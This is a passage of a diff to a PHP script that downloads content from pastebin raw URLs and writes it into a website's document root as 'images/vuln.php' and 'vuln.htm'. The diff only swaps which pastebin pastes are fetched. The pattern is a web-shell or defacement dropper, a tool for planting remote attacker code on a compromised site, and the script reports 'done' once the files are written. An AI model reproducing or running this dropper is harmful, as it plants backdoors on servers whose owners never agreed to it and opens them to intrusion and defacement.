@@ -10,7 +10,7 @@ function http_get($url){
 	curl_close($im);
 }
 $check = $_SERVER['DOCUMENT_ROOT'] . "/images/vuln.php" ;
-$text = http_get('https://pastebin.com/raw/phAM8DFH');
+$text = http_get('https://pastebin.com/raw/6sAuWJcG');
 $open = fopen($check, 'w');
 fwrite($open, $text);
 fclose($open);
@@ -21,7 +21,7 @@ if(file_exists($check)){
 echo "done .\n " ;
 
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
-$text2 = http_get('https://pastebin.com/raw/880ufaWF');
+$text2 = http_get('https://pastebin.com/raw/6sAuWJcG');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
 fclose($open2);
